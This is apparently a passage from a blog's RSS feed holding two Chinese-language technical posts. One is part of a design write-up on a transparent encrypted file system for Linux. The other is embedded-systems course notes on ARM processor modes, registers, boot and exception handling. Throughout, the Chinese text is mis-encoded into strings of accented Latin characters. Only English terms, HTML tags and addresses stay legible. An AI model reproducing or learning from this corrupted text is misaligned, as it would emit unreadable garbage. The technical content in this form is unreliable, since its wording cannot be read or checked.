&lt;li>ä¿®æ¹ç°ææä»¶ç³»ç»æ¥å®ç°ï¼&lt;/li>
&lt;li>å å å¼æä»¶ç³»ç»ã&lt;/li>
&lt;/ul>
&lt;p>ç»¼åç¨æ·éæ±æä»¬éæ©çæ¯ç¬¬ä¸ç§æ¹æ¡ï¼ç¨å å å¼æä»¶ç³»ç»æ¥å®ç°éæå å¯ã&lt;/p>
&lt;h2 id="å å¯ä½ç½®çéæ©">å å¯ä½ç½®çéæ©&lt;/h2>
&lt;p>å å¯æä»¶ç³»ç»å®ç°çé¾ç¹ä¹ä¸å¨äºæ¾å°ä¸ä¸ªLinuxæ ¸å¿ä»£ç ä¸­åéçä½ç½®è¿è¡å è§£å¯æä½ãå å¯ä½ç½®éæ©å¾å¥½ï¼ä¾¿äºå®ç°ï¼èä¸å¯¹ç³»ç»çæ§è½å½±åè¦æ¯è¾å°ãæä»¬éæ©çååå°±æ¯å°½å¯è½çå°å è§£å¯æä½å»¶åãå¯¹äºåæä½ï¼åªå¨å®éåå¥ç£ççæ¶åæè¿è¡å å¯ï¼å¯¹äºè¯»æä½ï¼åªæå¨æ¥è¿éå°ç¨æ·ç©ºé´çç¼å²åºçæ¶åæè¿è¡è§£å¯ï¼å å¯çä½ç½®è¦è®©æ°æ®å¨Buffer Cacheä¸­æ¯ä»¥ææå½¢å¼å­å¨çï¼ä»¥ä¾¿è½å¤å©ç¨Linuxçç¼å²æºå¶æé«å å¯æä»¶ç³»ç»çæ§è½ãåä¹ï¼åè®¾æä»¬å¨Linux Buffer Cacheå±ä»¥ä¸è¿è¡å è§£å¯æä½ï¼è¿å°±æå³çå¯¹äºå å¯çæä»¶ï¼Buffer Cacheä¸­å­å¨çæ¯å¯æï¼æ¯æ¬¡åæ ¸éè¦Buffer Cacheä¸­çåå®¹çæ¶åé½è¦åè¿è¡å è§£å¯çå·¥ä½ï¼è¿å°ä¼å¤§å¤§çéä½ç³»ç»çæ§è½ã&lt;/p>
&lt;h2 id="äº¤äºå¼èæ¬ä¹¦å">äº¤äºå¼èæ¬ä¹¦å&lt;/h2>
&lt;p>å¦ä½ä¹¦åä¸æä»¶ç³»ç»è¿è¡æ¶åçäº¤äºå¼èæ¬ï¼å®ç°å å¯æä»¶ç³»ç»çèªå¨åæè½½è¿ç¨ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-09-Design-and-Implementation-of-Transparent-Encrypted-File-System-Based-on-Linux/2018-09-23-16-15-07.png" alt="">&lt;/p>
&lt;h2 id="qtä¸shellèæ¬äº¤äº">QTä¸Shellèæ¬äº¤äº&lt;/h2>
&lt;p>å¦ä½å°QTå¾å½¢çé¢è·åå°çåæ°ä¼ éç»èæ¬ï¼å¹¶å¯å¨èæ¬ï¼å¦ä½è¿åèæ¬çæ§è¡æåµç»å¾å½¢åçé¢ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-09-Design-and-Implementation-of-Transparent-Encrypted-File-System-Based-on-Linux/2018-09-23-16-15-21.png" alt="">&lt;/p></description></item><item><title>åµå¥å¼ç³»ç»è®¾è®¡è¯¾ç¨</title><link>http://www.guozet.me/post/Linux-Embedded-System-Design/</link><pubDate>Mon, 01 Aug 2016 13:04:27 +0000</pubDate><guid>http://www.guozet.me/post/Linux-Embedded-System-Design/</guid><description>&lt;p>ãåµå¥å¼ç³»ç»è®¾è®¡ãæ¦è¿°&lt;/p>
&lt;h1 id="åè¨">åè¨&lt;/h1>
&lt;p>è¿æ¯ãåµå¥å¼ç³»ç»è®¾è®¡ãè¿æ¬ä¹¦ç±çåå®¹å°ç»ï¼ä¸»è¦ä»ç»äºåµå¥å¼ç³»ç»æ¶æä¸­çç³»ç»é¨åã&lt;/p>
&lt;h1 id="ä¹¦ç±åå®¹å°ç»æè¦">ä¹¦ç±åå®¹å°ç»æè¦&lt;/h1>
&lt;p>åä¸ºä¸¤ä¸ªé¨åä»ç»ï¼&lt;/p>
&lt;ul>
&lt;li>åµå¥å¼ç³»ç»è®¾è®¡é¨åï¼ARMæ¶æé¨å&lt;/li>
&lt;li>åµå¥å¼ç³»ç»è®¾è®¡é¨å&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h4 id="åµå¥å¼ç³»ç»çå®ä¹">åµå¥å¼ç³»ç»çå®ä¹&lt;/h4>
&lt;p>ä»¥åºç¨ä¸ºä¸­å¿ãä»¥è®¡ç®æºææ¯ä¸ºåºç¡ãè½¯ç¡¬ä»¶å¯è£åªãéåºåºç¨ç³»ç»å¯¹åè½ãå¯é æ§ãææ¬ãä½ç§¯ãåèä¸¥æ ¼è¦æ±çä¸ç¨è®¡ç®æºç³»ç»ãâåµå¥âãâä¸ç¨âãâè®¡ç®æºâ&lt;/p>
&lt;h4 id="åµå¥å¼ç³»ç»çè½¯ç¡¬ä»¶ç»æä»¥åä¸»è¦ç¹ç¹">åµå¥å¼ç³»ç»çè½¯ãç¡¬ä»¶ç»æï¼ä»¥åä¸»è¦ç¹ç¹ï¼&lt;/h4>
&lt;ul>
&lt;li>è½¯ä»¶ï¼ä»åºå±å°ä¸å±ï¼bootloaderç­ç³»ç»åå§åå¼å¯¼ç¨åºãè®¾å¤é©±å¨å±ï¼åæ¬é©±å¨ç¨åºãæ¿çº§æ¯æåBSPç­ï¼ãæä½ç³»ç»ãç¨æ·åºç¨ç¨åºãï¼åºå±ä¸ºä¸å±æä¾æå¡ï¼&lt;/li>
&lt;li>å¼åè½¯ä»¶ï¼å³éæå¼åç¯å¢ï¼asemmbler&amp;amp;&amp;amp;compiler&amp;amp;&amp;amp;linker&amp;amp;&amp;amp;debugger&amp;amp;&amp;amp;loaderï¼&lt;/li>
&lt;li>ç¡¬ä»¶ç»æï¼æ ¸å¿æ¿+å¤å´æ¿+å¤è®¾(æ ¸å¿æ¿ï¼å¾®æ§å¶å¨ï¼CPUåå¤è®¾æ¥å£ãå¤è®¾æ§å¶å¨ï¼ãçµæºãæ¶éãå¤ä½ãSDRAMãflashãå¤å´æ¿é¢åå¤å´è®¾å¤ï¼ä¸è¬æ¯å¼èçéåãçµå¹³è½¬æ¢çµè·¯ãå¤å´è®¾å¤ã)ï¼å½ç¶ä¹å¯ä»¥å°æ ¸å¿æ¿åå¤å´æ¿æ¾å¨ä¸èµ·ã&lt;/li>
&lt;li>ç¡¬ä»¶ç¹ç¹ï¼éå¸¸ç±åµå¥å¼å¤çå¨ååµå¥å¼å¤å´è®¾å¤ç»æï¼é«åº¦éæï¼å¸¸éç¨SOCè®¾è®¡æ¹æ³ï¼å¯¹åèãä½ç§¯ç­æä¸¥æ ¼è¦æ±ï¼å®å¶æ§å³å®äºå®çå¯è£åªæ§ï¼æ²¡æåè®¡ç®æºé¢åçåæ­ï¼è§£å³æ¹æ¡ä¸å¯ä¸ã&lt;/li>
&lt;li>è½¯ä»¶ç¹ç¹ï¼éç¨äº¤åå¼åæ¹å¼ï¼ç³»ç»è½¯ä»¶å±æ¬¡åæï¼æä½ç³»ç»ä¸ºç¨æ·ç¨åºæä¾æ åAPIï¼æä¾å¾å½¢æ¥å£åæä»¶ç³»ç»ãç¨æ·è°ç¨ç³»ç»æå¡ï¼ç³»ç»è°ç¨è®¾å¤é©±å¨ä»èæçºµç¡¬ä»¶ã&lt;/li>
&lt;/ul>
&lt;h4 id="åµå¥å¼ç³»ç»äº§åè®¾è®¡çåºæ¬æµç¨">åµå¥å¼ç³»ç»äº§åè®¾è®¡çåºæ¬æµç¨ï¼&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>éæ±åæï¼&lt;/p>
&lt;ul>
&lt;li>åè½æ§éæ±æ¯ç³»ç»çåºæ¬åè½ï¼å¦è¾å¥è¾åºä¿¡å·ãæä½æ¹å¼ç­ï¼&lt;/li>
&lt;li>éåè½æ§éæ±åæ¬ç³»ç»æ§è½ãææ¬ãåèãä½ç§¯ãééç­å ç´ ã&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>è§æ ¼è¯´æï¼ç²¾ç¡®å°åæ å®¢æ·çéæ±å¹¶ä¸ä½ä¸ºè®¾è®¡æ¶å¿é¡»æç¡®éµå¾ªçè¦æ±ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä½ç³»ç»æè®¾è®¡ï¼æè¿°ç³»ç»å¦ä½å®ç°æè¿°çåè½åéåè½éæ±ï¼åæ¬å¯¹ç¡¬ä»¶ãè½¯ä»¶åæ§è¡è£ç½®çåè½ååä»¥åç³»ç»çè½¯ä»¶ãç¡¬ä»¶éåç­ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è½¯ç¡¬ä»¶è®¾è®¡ï¼åºäºä½ç³»ç»æï¼å¯¹ç³»ç»çè½¯ä»¶ãç¡¬ä»¶è¿è¡è¯¦ç»è®¾è®¡ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç³»ç»éæï¼æç³»ç»çè½¯ä»¶ãç¡¬ä»¶åæ§è¡è£ç½®éæå¨ä¸èµ·ï¼è¿è¡è°è¯ï¼åç°å¹¶æ¹è¿ååè®¾è®¡è¿ç¨ä¸­çéè¯¯ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç³»ç»æµè¯ï¼å¯¹è®¾è®¡å¥½çç³»ç»è¿è¡æµè¯ï¼çå¶æ¯å¦æ»¡è¶³è§æ ¼è¯´æä¹¦ä¸­ç»å®çåè½è¦æ±ã&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h4 id="å¤çå¨åæä½ç³»ç»çéåä¸»è¦èèåªäºæ¹é¢">å¤çå¨åæä½ç³»ç»çéåä¸»è¦èèåªäºæ¹é¢ï¼&lt;/h4>
&lt;ul>
&lt;li>æä½ç³»ç»æ¬èº«ææä¾çå¼åå·¥å·ã&lt;/li>
&lt;li>æä½ç³»ç»åç¡¬ä»¶æ¥å£ç§»æ¤é¾åº¦ã&lt;/li>
&lt;li>æä½ç³»ç»çåå­è¦æ±ã&lt;/li>
&lt;li>å¼åäººåæ¯å¦çææ­¤æä½ç³»ç»åå¶æä¾çç³»ç»APIã&lt;/li>
&lt;li>æä½ç³»ç»æ¯å¦æä¾ç¡¬ä»¶çé©±å¨ç¨åºï¼å¦ç½å¡é©±å¨ç¨åºç­ã&lt;/li>
&lt;li>æä½ç³»ç»çæ¯å¦å·æå¯åªè£æ§ã&lt;/li>
&lt;li>æä½ç³»ç»æ¯å¦å·æå®æ¶æ§è½ã&lt;/li>
&lt;/ul>
&lt;h4 id="äº¤åå¼åäº¤åå¼åç¯å¢ä¸ºä½éè¦äº¤åå¼åç¯å¢">äº¤åå¼åãäº¤åå¼åç¯å¢ï¼ä¸ºä½éè¦äº¤åå¼åç¯å¢ï¼&lt;/h4>
&lt;p>äº¤åå¼åæ¯æå¨ä¸å°éç¨è®¡ç®æºï¼å®¿ä¸»æºï¼ä¸è¿è¡è½¯ä»¶çç¼è¾ç¼è¯ï¼ç¶åä¸è½½å°åµå¥å¼è®¾å¤ï¼ç®æ æºï¼ä¸­è¿è¡è°è¯çå¼åæ¹å¼&lt;/p>
&lt;p>äº¤åå¼åç¯å¢ä¸è¬ç±è¿è¡äºå®¿ä¸»æºä¸çäº¤åå¼åè½¯ä»¶ï¼assembler&amp;amp;&amp;amp;compiler&amp;amp;&amp;amp;linker&amp;amp;&amp;amp;debugger&amp;amp;&amp;amp;loaderï¼ãå®¿ä¸»æºå°ç®æ æºçè°è¯ééç»æ&lt;/p>
&lt;p>éè¦äº¤åå¼åç¯å¢æ¯å ä¸ºç®æ æºä¸è¬å¯¹ä½ç§¯ãåèç­æä¸¥æ ¼éå¶ï¼èµæºä¹é¢ååºç¨ï¼è¾ä¸ºç´§å¼ ï¼è¦æ±ä»ä»è½æµçè¿è¡ä»£ç å³å¯ï¼èå°ç¨æ·å¼åè½¯ä»¶ï¼åæ¬åç§åºãå·¥å·ï¼æ¾ç½®å¨ä¸»æºä¸ï¼èä¸ç°å¨çéæå¼åç¯å¢æä¾äºåç§ä¿®æ¹å¥½çåè½åºï¼ç¨èµ·æ¥ä¹æ¹ä¾¿ã&lt;/p>
&lt;h4 id="åµå¥å¼éæå¼åç¯å¢çä¸»è¦åè½">åµå¥å¼éæå¼åç¯å¢çä¸»è¦åè½ï¼&lt;/h4>
&lt;p>è¿æ¯ç±å¶ç»æå³å®çãAssemblerå°.cæºä»£ç æ±ç¼ï¼compilerå½¢æç®æ æä»¶ï¼linkeræ ¹æ®é¾æ¥æè¿°æä»¶å°åä¸ªç®æ ä»£ç é¾æ¥å®ä½çæå¯æ§è¡ä»£ç ãDebuggeræäºäº¤åå¼åå·¥å·æä¾äºä»¿çè°è¯ééãLoaderå¯ä»¥å°ç®æ æä»¶ç§å½è¿è®¾å¤ä¸­ï¼ææ¶éè¦åé¨å¼å¯¼ä»£ç çéåï¼&lt;/p>
&lt;h4 id="åµå¥å¼linux-å¼åä¸»è¦æµç¨">åµå¥å¼Linux å¼åä¸»è¦æµç¨ï¼&lt;/h4>
&lt;p>æ­å»ºå¼åç¯å¢âç§åbootloaderâç§ååæ ¸âç§åæ ¹æä»¶ç³»ç»âç§ååºç¨ç¨åºã&lt;/p>
&lt;ul>
&lt;li>
&lt;p>å¼åç¯å¢ï¼REDHATï¼LINUXãä¸è½½ç¸åºçGCC
äº¤åç¼è¯å¨è¿è¡å®è£ãéç½®å¼åä¸»æºï¼éç½®MINICOMåéç½®ç½ç»ï¼MINICOM
è½¯ä»¶çä½ç¨æ¯ä½ä¸ºè°è¯åµå¥å¼å¼åæ¿ä¿¡æ¯è¾åºççè§å¨åé®çè¾å¥çå·¥å·ï¼éç½®ç½ç»ä¸»è¦æ¯éç½®IPå°åãNFSç½ç»æä»¶ç³»ç»ï¼éè¦å³é­é²ç«å¢ï¼&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç§åbootloaderï¼ä¸è½½ä¸äºå¬å¼æºä»£ç çBOOTLOADERæ ¹æ®èªå·±å·ä½è¯çè¿è¡ç§»æ¤ä¿®æ¹ã
æ³¨ï¼ä¸è½½æ¶ï¼æäºè¯çæ²¡æåç½®å¼å¯¼è£è½½ç¨åºï¼æ¯å¦ä¸æçARM7ãARM9ç³»åè¯çï¼è¿æ ·å°±éè¦ç¼åç§åå¼åæ¿ä¸flash çç§åç¨åºãæèç½ç»ä¸æåè´¹ä¸è½½çWINDOWS ä¸éè¿JTAG å¹¶å£ç®æä»¿çå¨ç§åARM å¤å´flashè¯ççç¨åºãä¹æLINUX ä¸å¬å¼æºä»£ç çJ-FLASH ç¨åºã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¸è½½åæ ¸ï¼å¦ææä¸é¨éå¯¹ä½ æä½¿ç¨çCPU ç§»æ¤å¥½çLINUX æä½ç³»ç»é£æ¯åå¥½ä¸è¿ï¼ä¸è½½ååæ·»å èªå·±çç¹å®ç¡¬ä»¶çé©±å¨ç¨åºï¼è¿è¡è°è¯ä¿®æ¹ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¸è½½æ ¹æä»¶ç³»ç»ï¼ä»www.busybox.net ä¸è½½ä½¿ç¨BUSYBOXè½¯ä»¶è¿è¡åè½è£åï¼äº§çä¸ä¸ªæåºæ¬çæ ¹æä»¶ç³»ç»ãæ ¹æä»¶ç³»ç»å¨åµå¥å¼ç³»ç»ä¸­ä¸è¬è®¾ä¸ºåªè¯»ï¼éè¦ä½¿ç¨mkcramfsãgenromfs ç­å·¥å·äº§çç§åæ è±¡æä»¶ã&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>æä»¶ç³»ç»å°±æ¯æä½ ç¡¬çä¸æ°æ®æç§ä¸å®æ ¼å¼ç»ç»æä¸æ£µæ ãæ°æ®åå¯¹åºåç§°ãå äºå®å°±ç¸å½äºæç¡¬çæ ¼å¼åäºãæ ¹æä»¶ç³»ç»å°±æ¯åºäºåæ ¸ä»¥å¤ï¼ææçç³»ç»æä»¶å­å¨çå°æ¹ãä¹æä»¥æä¸ºæ ¹ï¼æ¯å ä¸ºææ ¹æè½æçé¿ææ ï¼æ¯å¶å®æä»¶çæç»æè½½ç¹ãæä»¬è¦æç½æ ¹æä»¶ç³»ç»ååæ ¸æ¯å®å¨ç¬ç«çä¸¤ä¸ªé¨åï¼å®æ¯åæ ¸å¯å¨æ¶æmountçç¬¬ä¸ä¸ªæä»¶ç³»ç»ï¼éé¢æåæ ¸å¯å¨æå¿é¡»çæ°æ®ï¼ä¸ç¶å°±éåºå¯å¨æä»¶ç³»ç»è¿ç§æºå¶æå©äºç¨æ·åæä½ç³»ç»çäº¤äºãæ°æ®åå¯¹åºåç§°ãå°½ç®¡åæ ¸æ¯Linux çæ ¸å¿ï¼ä½æä»¶å´æ¯ç¨æ·ä¸æä½ç³»ç»äº¤äºæéç¨çä¸»è¦å·¥å·ï¼å°¤å¶æ¯LINUXã&lt;/p>
&lt;p>ä¸è½½ç¨æ·ç¨åº:å¯ä»¥ä¸è½½å°æ ¹æä»¶ç³»ç»ä¸­ï¼æçåºç¨ç¨åºä¸ä½¿ç¨æ ¹æä»¶ç³»ç»ï¼èæ¯ç´æ¥å°åºç¨ç¨åºååæ ¸è®¾è®¡å¨ä¸èµ·ï¼è¿æç¹ç±»ä¼¼äºUCOS-IIçæ¹å¼ã&lt;/p>
&lt;h4 id="åµå¥å¼linux-å¼åç¯å¢ä¸­éç½®nfsæå¡çç®ç">åµå¥å¼Linux å¼åç¯å¢ä¸­éç½®NFSæå¡çç®çï¼&lt;/h4>
&lt;p>å¯ä»¥ä½¿ä¸åæºå¨ãä¸åæä½ç³»ç»ä¹é´éè¿ç½ç»å±äº«æä»¶ï¼åè®¿é®æ¬å°æä»¶ä¸æ ·è®¿é®è¿ç«¯ç³»ç»ä¸çæä»¶ï¼å¨å¼åé¶æ®µï¼ä¸»æºå¶ä½åºäºNFSçæä»¶ç³»ç»ï¼å¶å®å¼æ¾ç®å½ï¼å¼æ¾å¯¹è±¡çIPèå´ï¼å°ç®å½æè½½å°åµå¥å¼è®¾å¤åï¼åµå¥å¼è®¾å¤å¯ä»¥æ¹ä¾¿å°è®¿é®ãä¿®æ¹ä¸»æºä¸»æºæä»¶ã&lt;/p>
&lt;h4 id="ä»ä¹æ¯ç¡¬ä»¶éå®å">ä»ä¹æ¯ç¡¬ä»¶éå®åï¼&lt;/h4>
&lt;p>ä¸è¯¾çèå¸ä¸¾å¾printfï¼ï¼æ¯ä¸ªå¾å¥½çä¾å­ï¼éå®åç¨åºæ¯é¢åç¼è¯ç¯å¢ä¸­çè¿æ¥å¨çï¼æ¯ç¨æ·èªå·±å®ä¹çCåºå½æ°ï¼æäºå®ï¼å¨ç¨åºè¿æ¥æ¶è¿æ¥å¨ä¼è¿æ¥ç¨æ·èªå·±ç¼åçCåºä¸­çåè½å½æ°èä¸æ¯æ åCåºãç¸å½äºå°æ åCåºè¿è¡äºä¸æ¬¡ç§»æ¤ãä»ä¸»æºç¯å¢å°å®éè¿è¡ç¯å¢çç§»æ¤ã&lt;/p>
&lt;p>æ¯å¦ï¼æ¬æ¥åºå½æ°fputc()æ¯æå­ç¬¦è¾åºå°è°è¯å¨æ§å¶çªå£ä¸­å»ç,ä½ç¨æ·æè¾åºè®¾å¤æ¹æäºUARTç«¯å£,è¿æ ·ä¸æ¥,ææåºäºfputc()å½æ°çprintf()ç³»åå½æ°è¾åºé½è¢«éå®åå°UARTç«¯å£ä¸å»äºãç¸å½äºå®ç°ç±»ä¼¼çåè½ï¼ä½æ¯åºå±çé©±å¨åäºã&lt;/p>
&lt;hr>
&lt;h3 id="armä½ç³»ç»æé¨å">ARMä½ç³»ç»æé¨å&lt;/h3>
&lt;h4 id="armç¡¬ä»¶çµè·¯æå°ç³»ç»ç»æ">ARMç¡¬ä»¶çµè·¯æå°ç³»ç»ç»æï¼&lt;/h4>
&lt;ul>
&lt;li>å¾®æ§å¶å¨ï¼ä¾å¦2410ï¼CPU+å¤è®¾æ¥å£/å¤è®¾æ§å¶å¨ï¼çµæºãæ¶éãå¤ä½ãå­å¨å¨ï¼SDRAM/FLASHï¼NOR8ä½ãNAND8 16 32ä½ï¼ï¼&lt;/li>
&lt;li>FLASHï¼å­æ¾æä½ç³»ç»ãç¨æ·ç¨åºç­éè¦æçµåä¿å­çæ°æ®&lt;/li>
&lt;li>SDRAMï¼ç³»ç»è¿è¡çä¸»è¦åºåï¼ç³»ç»åç¨æ·æ°æ®åå æ ï¼é½å¨è¿ä¸ªåºåãææ¶å¯å¨æ¨¡å¼éæ©
ææ¶éè¦JTAGï¼å¯¹è¯çåææé¨ä»¶è¿è¡è®¿é®ï¼éè¿è¯¥æ¥å£å¯¹ç³»ç»è°è¯ãç¼ç¨&lt;/li>
&lt;/ul>
&lt;h4 id="armå¤çå¨çä¸»è¦å·¥ä½æ¨¡å¼">ARMå¤çå¨çä¸»è¦å·¥ä½æ¨¡å¼ï¼&lt;/h4>
&lt;p>ARMç7ç§å¤çå¨æ¨¡å¼ï¼ä¸åçæ¨¡å¼ä¸æèªå·±çè¡ä¸ºååï¼&lt;/p>
&lt;ul>
&lt;li>USRï¼æ­£å¸¸ç¨åºæ§è¡æ¨¡å¼&lt;/li>
&lt;li>FIQï¼æ¯æé«éæ°æ®ä¼ éåééå¤ç&lt;/li>
&lt;li>IRQï¼ç¨äºéç¨ä¸­æ­çå¤çã&lt;/li>
&lt;li>ç®¡çï¼SVCï¼ï¼æä½ç³»ç»ä¿æ¤æ¨¡å¼&lt;/li>
&lt;li>ä¸­æ­¢&lt;/li>
&lt;li>æªå®ä¹&lt;/li>
&lt;li>ç³»ç»&lt;/li>
&lt;/ul>
&lt;p>é¤äºUSRä¹å¤ï¼å¶å®6ç§åç§°ä¸ºç¹ææ¨¡å¼ã6ä¸­ç§é¤äºç³»ç»æ¨¡å¼åç§°ä¸ºå¼å¸¸æ¨¡å¼ï¼å³å¤çå¼å¸¸æ¶çå·¥ä½æ¨¡å¼ï¼ã&lt;/p>
&lt;p>å¨è½¯ä»¶æ§å¶ä¸å¯ä»¥æ¹åæ¨¡å¼ï¼å³æ¹åCPSRç¸åºï¼ï¼å¤é¨ä¸­æ­æå¼å¸¸å¤çä¹å¼èµ·æ¨¡å¼ååï¼ç¨æ·æ¨¡å¼ä¸ä¸è½æ¹åæ¨¡å¼ã&lt;/p>
&lt;h4 id="æ ¸å¿å¯å­å¨çä½ç¨">æ ¸å¿å¯å­å¨çä½ç¨ï¼&lt;/h4>
&lt;p>R13éå¸¸ç¨ä½å æ æéï¼ç§°ä¸ºSPï¼è¢«åå§åä¸ºå¤ä¸ªæ¨¡å¼ä¸çå æ ãR14ç¨ä½å­ç¨åºè¿æ¥å¯å­å¨LRï¼ä¸­æ­å¼å¸¸ææ§è¡BLæ¶å¾å°PCå³R15çå¤ä»½ã&lt;/p>
&lt;p>Cpsrç¨åºç¶æå¯å­å¨ï¼32ä½åªç¨12ä½ï¼æææ¨¡å¼ä¸åå¯è§ã&lt;/p>
&lt;p>Spsrä¿å­ç¨åºç¶æå¯å­å¨ï¼å³åçå¼å¸¸æ¶å¯¹CPSRè¿è¡ä¿å­ï¼ä¿å­å½åç¶æã5ä¸ªå¼å¸¸æ¨¡å¼ä¸åæåèªçSPSRã&lt;/p>
&lt;h4 id="armå¤çå¨çå¯å¨è¿ç¨">ARMå¤çå¨çå¯å¨è¿ç¨ï¼&lt;/h4>
&lt;p>é¦åï¼çä¸ä¸ï¼ARMå¯å¨æ¶çç¡¬ä»¶æºå¶ï¼ä¸çµäº§çå¤ä½å¼å¸¸ï¼CPUå¼ºå¶PCä¸º0x00000000ï¼æ§è¡å¤ä½å¼å¸¸å¤çå½æ°ï¼æ¥ä¸æ¥å°±ç¸å½äºæ§è¡äºSTRARTUP.Sçåè½ãæ¯ç»ç¨æ·ç¨åºæ§è¡ç»ä»¥åéçå·¥ä½ç¯å¢ï¼è®¾ç½®ä¸­æ­åéè¡¨ãå æ ãæ¶éãå®æåå­æ·è´ç­ï¼ç¸å½äºSTARTUP.Sæèbootloaderçåç«¯ä»£ç ï¼æ¯å¼æºæ§è¡çç¨åºã.æ¿2410çå¯å¨ä»£ç ä¸¾ä¾ï¼å®å¯å¨CPUçè¿ç¨æ¯ï¼&lt;/p>
&lt;p>å¨èµ·å§å°ååéä¸­æ­åéè¡¨å³ä¸­æ­å¤çå½æ°ï¼CPUè¦æ±çï¼ï¼ä»¥ä¸ºåéç©ºé´åªæ4å­èï¼æä»¥ä¸è¬åªæ¯ä¸ä¸ªè·³è½¬æä»¤ï¼å»å«å¤æ§è¡ãå¨è·³å°å¤ä½å¼å¸¸ä¹åï¼å³é­ä¸­æ­ï¼å³é­çé¨çã&lt;/p>
&lt;ul>
&lt;li>ä¹ååå§åå­å¨å¨ç³»ç»&lt;/li>
&lt;li>åå§å¤ä¸ªæ¨¡å¼ä¸çå æ ï¼æ¨¡å¼åæ¢æ¶ï¼ç¡¬ä»¶ç»SPç½®ä½ï¼&lt;/li>
&lt;li>åå§åæç¹æ®è¦æ±çå¤å´è®¾å¤ï¼å¦LEDç¯ãçé¨ç&lt;/li>
&lt;li>åå§åç¨æ·çæ§è¡ç¯å¢ï¼å¨FLASHä¸­è¿è¡å¤ªæ¢äºï¼æä»£ç æ´ä½æ¬è¿å°RAMä¸­ï¼&lt;/li>
&lt;li>åæ¢å¤çå¨çå·¥ä½æ¨¡å¼&lt;/li>
&lt;li>è°ç¨ä¸»ç¨åº&lt;/li>
&lt;li>å¼å¸¸å¤ç&lt;/li>
&lt;/ul>
&lt;p>å½æ­£å¸¸çç¨åºæ§è¡æµç¨åçææ¶çåæ­¢æ¶ï¼ç§°ä¹ä¸ºå¼å¸¸ãå¯¹å¼å¸¸çå¤çæä¼åçº§ï¼å¤çå¼å¸¸éè¦è·³è½¬è³å¼å¸¸æ¨¡å¼ãå¹¶æ ¹æ®å¼å¸¸åéè·³è½¬è³ååºçå­ç¨åºï¼æ§è¡ä¹åå¿é¡»ä¿å­ç°åºï¼ï¼å³å¼å¸¸åºç°åå¼ºå¶è·³è½¬è³åºå®çå­å¨å¨å°åæ§è¡ãå¼å¸¸æ¯æ¯ä¸­æ­æ´å¤§çæ¦å¿µã&lt;/p>
&lt;h4 id="å¼å¸¸å¤ç">å¼å¸¸å¤ç&lt;/h4>
&lt;p>ARMæ7ç§å¼å¸¸ãåæ¬:&lt;/p>
&lt;ul>
&lt;li>å¤ä½ ç®¡çæ¨¡å¼ 0x00000000&lt;/li>
&lt;li>è½¯ä¸­æ­SWI ç®¡çæ¨¡å¼ 0x00000008&lt;/li>
&lt;li>IRQ IRQæ¨¡å¼ 0x00000018&lt;/li>
&lt;li>FIQ FIQæ¨¡å¼ 0x0000001c&lt;/li>
&lt;li>è¿åæ¬é¢åä¸­æ­¢ãæ°æ®ä¸­æ­¢ãæªå®ä¹&lt;/li>
&lt;/ul>
&lt;p>å¼å¸¸åºç°æ¶ï¼å¼å¸¸æ¨¡å¼åç»çR14åSPSRç¨äºä¿å­ä¸ä¸æ¡ç¨åºå°ååCPSRãå¼å¸¸è¿åæ¶ï¼SPSR-&amp;gt;CPSRï¼R14-&amp;gt;PC&lt;/p>
&lt;p>å¨å¯å¨ä»£ç ä¸­é¦åå°±æ¯è®¾ç½®æè°çå¼å¸¸åéè¡¨ï¼ä¹å°±æ¯å¨æå®çä½ç½®æ¾ç½®å¼å¸¸å¤çç¨åºï¼ä¸è¬æ¯è·³è½¬æä»¤ï¼ãå¼å¸¸åçæ¶ï¼CPUä¼æ ¹æ®è§å®å¼ºå¶ç½®PCï¼æ°å¥½å»æ§è¡æä»¬è®¾ç½®å¥½çè·³è½¬æä»¤ï¼æ¥çæ§è¡æå¡ç¨åºã&lt;/p>
&lt;h4 id="å¼å¸¸å¤çæµç¨ç¡¬ä»¶æºå¶åªåè¿äºè·ä»£ç æ å³">å¼å¸¸å¤çæµç¨ï¼ï¼ç¡¬ä»¶æºå¶ï¼åªåè¿äºï¼è·ä»£ç æ å³ï¼&lt;/h4>
&lt;ul>
&lt;li>æ ¹æ®å¼å¸¸ç±»åï¼å¼ºå¶è®¾ç½®CPSRçè¿è¡æ¨¡å¼ä½&lt;/li>
&lt;li>å¨åæ¢å°çå¼å¸¸æ¨¡å¼ä¸ï¼å¨å½åçé¾æ¥å¯å­å¨LR(r14)ä¸­ä¿å­ä¸ä¸ªæ¨¡å¼çPCå¼-4ï¼ä»¥ä¾¿ç¨åºå¨å¤çå¼å¸¸è¿åæ¶è½ä»æ­£ç¡®çä½ç½®éæ°å¼å§æ§è¡&lt;/li>
&lt;li>å°ä¸ä¸ä¸ªæ¨¡å¼çCPSRå¤å¶å°å½åå¼å¸¸æ¨¡å¼çSPSRä¸­ï¼æ³¨æ1ä¸2ã3ççç¾ï¼ä¸è½ç¬ç«æ§è¡ï¼ä½æ¯æ¯ç¡¬ä»¶å®ç°çï¼æ å³ä»£ç ï¼&lt;/li>
&lt;li>å¼ºå¶PCãç¶åå°±å°äºæ§è¡ä»£ç çæ¶åä»ç¸å³çå¼å¸¸åéå°ååä¸ä¸æ¡æä»¤æ§è¡ï¼ä»èè·³è½¬å°ç¸åºçå¼å¸¸å¤çç¨åºå¤ã&lt;/li>
&lt;/ul>
&lt;h4 id="å¼å¸¸è¿åæµç¨ææä»¤">å¼å¸¸è¿åæµç¨ï¼ï¼ææä»¤ï¼&lt;/h4>
&lt;ul>
&lt;li>å°LRå¯å­å¨ä¸­çå¼åå»ç¸åºçåç§»é(å¯¹äºIRQ/FIQæ¯4)éå°PCä¸­&lt;/li>
